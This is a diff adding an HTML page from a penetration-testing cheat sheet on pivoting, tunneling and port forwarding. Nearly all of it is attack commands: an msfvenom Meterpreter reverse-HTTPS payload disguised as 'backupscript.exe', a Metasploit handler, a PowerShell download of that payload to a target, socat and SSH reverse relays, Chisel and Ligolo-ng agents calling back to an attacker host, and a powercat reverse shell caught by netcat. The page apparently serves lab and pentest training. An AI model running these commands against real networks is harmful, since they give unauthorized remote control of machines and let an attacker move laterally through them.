@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/Pivoting/Pivoting.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/Pivoting/Pivoting.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Pivoting/Pivoting.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="pivoting-tunneling-and-port-forwarding">Pivoting, Tunneling, and Port Forwarding</h1>
+<h2 id="ssh-local-port-forwarding">SSH Local Port Forwarding</h2>
+<p>Forward port 3306 from 10.129.202.64 to localhost 1234</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+</code></pre></div></div>
+
+<h3 id="enabling-dynamic-port-forwarding-with-ssh">Enabling Dynamic Port Forwarding with SSH</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -D 9050 ubuntu@10.129.202.64
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ tail -4 /etc/proxychains.conf
+
+# meanwile
+# defaults set to "tor"
+socks4 	127.0.0.1 9050
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ proxychains nmap -v -sn 172.16.5.1-200
+</code></pre></div></div>
+
+<h2 id="remotereverse-port-forwarding-with-ssh">Remote/Reverse Port Forwarding with SSH</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https
+payload =&gt; windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
+lhost =&gt; 0.0.0.0
+msf6 exploit(multi/handler) &gt; set lport 8000
+lport =&gt; 8000
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@pivot$ python3 -m http.server 8123
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN
+</code></pre></div></div>
+<h2 id="socat-redirection-with-a-reverse-shell">Socat Redirection with a Reverse Shell</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@pivot:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+</code></pre></div></div>
+
+<h2 id="port-forwarding-with-windows-netsh">Port Forwarding with Windows Netsh</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+</code></pre></div></div>
+
+<h2 id="socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</h2>
+<p><code class="language-plaintext highlighter-rouge">Find PID to kill</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lsof -i:8080 
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Local Machine</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chisel server --socks5 --reverse`
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Remote machine</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel client --fingerprint f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k= 10.10.15.23:8080 R:8081:127.0.0.1:445
+</code></pre></div></div>
+
+<h2 id="pivoting">Pivoting</h2>
+<h3 id="ligolo-ng"><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></h3>
+
+<p><a href="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740">Guide</a>
+<a href="https://www.youtube.com/watch?v=qou7shRlX_s">Video</a></p>
+
+<p><code class="language-plaintext highlighter-rouge">Proxy (Attack)</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo ip tuntap add user [your_username] mode tun ligolo
+
+$ sudo ip link set ligolo up
+
+$ ./proxy -selfcert
+$ ./proxy -autocert
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Agent (Target)</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt; ./agent -connect 10.10.15.184:11601 --ignore-cert
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Proxy (Attack)</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session
+
+[Agent : ubuntu@WEB01] » ifconfig
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : ubuntu@WEB01] » start
+</code></pre></div></div>
+
+<p><a href="https://jodies.de/ipcalc">IPCalculator</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>ip route add 172.16.4.0/23 dev ligolo
+</code></pre></div></div>
+
+<p>After that, we can scan for live hosts on new network found.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Proxy (Attack)</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sn</span> 172.16.5.0/24
+</code></pre></div></div>
+<h3 id="download-and-upload-files-from-and-to-target">Download and Upload files from and to Target</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Redirect 8080 on Agent machine to our Proxy 8080 to upload files to it </span>
+» listener_add <span class="nt">--addr</span> 0.0.0.0:8080 <span class="nt">--to</span> 127.0.0.1:8080 <span class="nt">--tcp</span>
+
+<span class="c"># Redirect 8000 on Agent machine to our Proxy 8000 to download files from it </span>
+» listener_add <span class="nt">--addr</span> 0.0.0.0:8000 <span class="nt">--to</span> 127.0.0.1:8000 <span class="nt">--tcp</span>
+</code></pre></div></div>
+
+<h4 id="reverse-shell-pivot-machine-to-attack-machine-throught-agent">Reverse Shell Pivot Machine to Attack Machine throught Agent</h4>
+<p><code class="language-plaintext highlighter-rouge">Proxy (Attack)</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : session] » listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lnvp 10000
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Agent(Target)</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/besimorhino/powercat/blob/master/powercat.ps1
+
+Copy into powershell
+
+C:\Users\victor&gt; powercat -c (Internal Pivot Machine Interface) -p 30000 -ep
+</code></pre></div></div>
+
+<h3 id="double-pivothttpsmediumcomissamqsousmastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c">Double Pivot[https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c]</h3>
+<ul>
+  <li>https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/</li>
+</ul>
+
+<p>After access to first machine or pivot, if exists another network we can also pivot to it.</p>
+
+<p>First we need to put agent on pivot machine, for it we need to open a port on our local machine and add a listener on pivot machine to redirect from port 8080 to our local port 9999.</p>
+
+<p><strong>Download Agent to Pivot - Proxy (Attack)</strong>
+Open port to pass our http server</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : session] » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:9999 --tcp
+</code></pre></div></div>
+
+<p><strong>Pivot New Target</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Download agent file from (Internal Pivot Machine Interface):8080
+</code></pre></div></div>
+
+<p><strong>Proxy (Attack)</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo ip tuntap add user [your_username] mode tun ligoloSec
+
+$ sudo ip link set ligoloSec up
+
+$ sudo ip route add 172.16.5.155 dev ligoloSec
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : session] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+</code></pre></div></div>
+
+<p><strong>Pivot New Target</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt; ./agent -connect (Internal Pivot Machine Interface):11601 --ignore-cert
+</code></pre></div></div>
+
+<p><strong>Proxy (Attack)</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Agent : session] » start --tun ligoloSec
+</code></pre></div></div>
+
+<h3 id="forward-ports-from-pivot-machine-to-attack-machine">Forward Ports from Pivot Machine to Attack Machine</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo ip route add 240.0.0.1/32 dev ligolo
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap 240.0.0.1
+</code></pre></div></div>
+
+
+      </section>
+    </div>
+  </body>
+</html>
